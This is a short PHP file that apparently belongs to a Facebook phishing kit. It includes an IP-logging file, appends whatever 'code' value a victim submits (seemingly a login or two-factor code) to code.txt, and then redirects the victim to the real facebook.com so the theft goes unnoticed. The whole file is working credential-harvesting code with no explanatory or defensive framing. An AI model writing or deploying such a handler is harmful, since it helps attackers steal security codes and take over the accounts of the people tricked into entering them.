<?php
include 'ip.php';

file_put_contents("code.txt", "[CODE]: " . $_POST['code'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com');
exit();
?>